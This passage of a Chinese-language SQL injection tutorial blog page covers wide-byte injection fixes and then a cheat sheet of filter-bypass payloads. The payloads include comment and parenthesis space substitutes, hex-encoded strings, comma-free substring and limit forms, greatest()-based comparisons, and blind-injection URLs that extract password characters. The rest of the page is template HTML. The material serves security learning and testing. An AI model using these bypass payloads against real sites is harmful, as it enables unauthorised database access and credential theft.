+<p>mysql_real_escape_string()函数，这个函数用来转义sql语句中的特殊符号x00 、\n  、\r  、\  、‘  、“ 、x1a。</p>
+<p>魔术引号：当打开时，所有的单引号’、双引号”、反斜杠\和NULL字符都会被自动加上一个反斜线来进行转义，这个和 addslashes()函数的作用完全相同。所以，如果魔术引号打开了，就不要使用addslashes()函数了。一共有三个魔术引号指令。 </p>
+<p>1.magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 在magic_quotes_gpc=on的情況下，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()；</p>
+<p>2.magic_quotes_runtime 如果打开的话，大部分从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。 参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。  </p>
+<p>3.magic_quotes_sybase 如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ‘’。而双引号、反斜线 和 NULL 字符将不会进行转义。 如何取得其值参见 ini_get()。<br><strong>宽字节注入的修复</strong></p>
+<p>在调用mysql_real_escape_string()函数之前，先设置连接所使用的字符集为GBK ，mysql_set_charset=(‘gbk’,$conn) 。这个方法是可行的。但是还是有很多网站是使用的addslashes()函数进行过滤，我们不可能把所有的addslashes()函数都换成mysql_real_escape_string()。</p>
+<p>所以防止宽字节注入的另一个方法就是将 character_set_client设置为binary(二进制)。需要在所有的sql语句前指定连接的形式是binary二进制：<br>mysql_query(“SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary”, $conn); </p>
+<p>当我们的Mysql收到客户端的请求数据后，会认为他的编码是character_set_client所对应的编码，也就是二进制。然后再将它转换成character_set_connection所对应的编码。然后进入具体表和字段后，再转换成字段对应的编码。当查询结果产生后，会从表和字段的编码转换成character_set_results所对应的编码，返回给客户端。所以，当我们将character_set_client编码设置成了binary，就不存在宽字节注入的问题了，所有的数据都是以二进制的形式传递。 </p>
+<h4 id="九、过滤绕过-1"><a href="#九、过滤绕过-1" class="headerlink" title="九、过滤绕过"></a>九、过滤绕过</h4><p>实际的实战过程中一般都会有过滤来避免SQL注入，例如preg_replace函数过滤了一些字符<br>preg_replace(‘A’ , ‘B’ , C)  ：执行一个正则表达式的搜索和替换，这个的意思是搜索C中符合A的部分，然后用B来代替。</p>
+<p>有关这个函数更多的详情：可查询preg_replace函数详解<br>1.空格绕过(使用/**/)<br>(1)如果只过滤了空格，没有过滤 /*  ，那么我们可以利用 /**/ 来绕过空格过滤。<br>(2)如果只过滤了空格，没有过滤括号()，则可以利用括号绕过。在Mysql中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。<br>http://……/?id=1’and(1=1)#<br>2.引号绕过(使用16进制)<br>   使用16进制绕过引号。一般会使用到引号的地方是在最后的where子句中，比如<br>select * from test where username=’ admin ‘;<br>select * from test where username=” admin “;<br>当引号被过滤了的话， ‘admin’就没法用了，我们可以用admin的16进制 0x61646d696e 代替。<br>select * from test where username=0x61646d696e;<br>3.逗号绕过(使用from for或者offset)<br>3.逗号绕过(使用from for或者offset)   </p>
+<pre><code>在使用盲注的时候，会使用到substring(),mid(), limit 函数。这些函数都需要用到逗号。如果只是过滤了逗号，则对于substring()和mid()这两个函数可以使用from  for的方式来绕过。对于limit ，可以用 offset 绕过。
+</code></pre><p>// substring() 逗号绕过<br>select * from test where id=1 and (select ascii(substring(username,2,1)) from admin limit 1)&gt;97;<br>select * from test where id=1 and (select ascii(substring(username from 2 for 1))from admin limit 1)&gt;97;   </p>
+<p>// mid() 逗号绕过<br>select * from test where id=1 and (select ascii(mid(username,2,1)) from admin limit 1)&gt;97;<br>select * from test where id=1 and (select ascii(mid(username from 2 for 1))from admin limit 1)&gt;97;   </p>
+<p>// limit 逗号绕过<br>select * from test where id=1 limit 1,2;<br>select * from test where id=1 limit 2 offset 1;<br>4.比较符&lt; &gt;绕过（使用greatest() 、least()）   </p>
+<pre><code>在使用盲注的时候，会用到二分法来比较操作符来进行操作。如果过滤了比较操作符，那么就需要使用到 greatest()和lease（）来进行绕过。greatest()返回最大值，least()返回最小值。
+</code></pre><p>greatest(n1,n2,n3…..)返回输入参数的最大值；   </p>
+<p>least(n1,n2,n3….)返回输入参数的最小值<br>select * from test where id=1 and ascii(substring(database(),0,1))&gt;64;<br>select * from test where id=1 and greatest(ascii(substring(database(),0,1)),64)=64</p>
+<p>5.or and xor not绕过  </p>
+<p>and用 &amp;&amp; 代替 ；or用 || 代替 ； xor用 | 代替 ； not用 ! 代替 ；<br>select * from test where id=1 and 1=2;<br>select * from test where id=1 &amp;&amp; 1=2；  </p>
+<p>select * from test where id=1 or 1=2;<br>select * from test where id=1 || 1=2;   </p>
+<p>6.注释符 # – 绕过   </p>
+<pre><code> 如果过滤了# 和 --   ，则可以利用 ||&#39;来绕过
+</code></pre><p>// 对于这种sql语句，可以用下面的语句构造绕过<br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
+<p>http://……./?id=1’ union 1,2,3 #   </p>
+<p>http://……./?id=1’ union 1,2,3||’   </p>
+<p>http://……./?id=1’ union 1,2,’3   </p>
+<p>7.等号=绕过  </p>
+<p>  使用like、rlike、regexp 或者使用 &lt;   &gt;　</p>
+<p>8.union、select、where绕过</p>
+<p>９.通用绕过（编码）</p>
+<p>如URL编码，ascii 编码，HEX , unicode 编码绕过等</p>
+<p>比如： Test可以为 char(101)+char(97)+char(115)+char(116)</p>
+<p>10.等价函数绕过<br>hex()、bin() ==&gt; ascii()</p>
+<p>sleep() ==&gt;benchmark()</p>
+<p>concat_ws()==&gt;group_concat()</p>
+<p>mid()、substr() ==&gt; substring()</p>
+<p>@@user ==&gt; user()</p>
+<p>@@datadir ==&gt; datadir()</p>
+<p>举例：substring()和substr()无法使用时：http://…./?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　</p>
+<p>或者：<br>substr((select ‘password’),1,1) = 0x70<br>strcmp(left(‘password’,1), 0x69) = 1<br>strcmp(left(‘password’,1), 0x70) = 0<br>strcmp(left(‘password’,1), 0x71) = -1    </p>
+<p><canvas id="c_n9" width="1920" height="990" style="position: fixed; top: 0px; left: 0px; z-index: -1; opacity: 0.5;"></canvas>     </p>
+<script src="https://files.cnblogs.com/files/jingmoxukong/canvas-nest.min.js"></script>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入终极指南"><span class="toc-number">1.</span> <span class="toc-text">SQL注入终极指南</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#目录"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#一、Boolean-盲注"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">一、Boolean 盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二、union注入"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">二、union注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#三、文件读写"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">三、文件读写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#四、floor报错注入"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">四、floor报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#五、Xpath函数错误注入"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">五、Xpath函数错误注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#六、sleep延时注入"><span class="toc-number">1.0.0.7.</span> <span class="toc-text">六、sleep延时注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#七、REGEXP正则匹配"><span class="toc-number">1.0.0.8.</span> <span class="toc-text">七、REGEXP正则匹配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#八、宽字节注入"><span class="toc-number">1.0.0.9.</span> <span class="toc-text">八、宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#九、过滤绕过"><span class="toc-number">1.0.0.10.</span> <span class="toc-text">九、过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#一、Boolean-盲注-1"><span class="toc-number">1.0.0.10.1.</span> <span class="toc-text">一、Boolean 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-判断数据库"><span class="toc-number">1.0.0.10.1.1.</span> <span class="toc-text">1.判断数据库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-判断当前数据库"><span class="toc-number">1.0.0.10.1.2.</span> <span class="toc-text">2.判断当前数据库</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-判断数据库中的表"><span class="toc-number">1.0.0.10.1.3.</span> <span class="toc-text">3.判断数据库中的表</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-判断表中的字段"><span class="toc-number">1.0.0.10.2.</span> <span class="toc-text">4. 判断表中的字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-判断字段中的数据"><span class="toc-number">1.0.0.10.3.</span> <span class="toc-text">5.判断字段中的数据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二：union-注入"><span class="toc-number">1.0.0.11.</span> <span class="toc-text">二：union 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#三、文件读写-1"><span class="toc-number">1.0.0.12.</span> <span class="toc-text">三、文件读写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#四：floor报错注入"><span class="toc-number">1.0.0.13.</span> <span class="toc-text">四：floor报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#五、Xpath函数错误注入-1"><span class="toc-number">1.0.0.14.</span> <span class="toc-text">五、Xpath函数错误注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#六、sleep延时注入-1"><span class="toc-number">1.0.0.15.</span> <span class="toc-text">六、sleep延时注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#七、REGEXP正则匹配-1"><span class="toc-number">1.0.0.16.</span> <span class="toc-text">七、REGEXP正则匹配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#八：宽字节注入"><span class="toc-number">1.0.0.17.</span> <span class="toc-text">八：宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#九、过滤绕过-1"><span class="toc-number">1.0.0.18.</span> <span class="toc-text">九、过滤绕过</span></a></li></ol></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"lift","width":200,"height":350},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
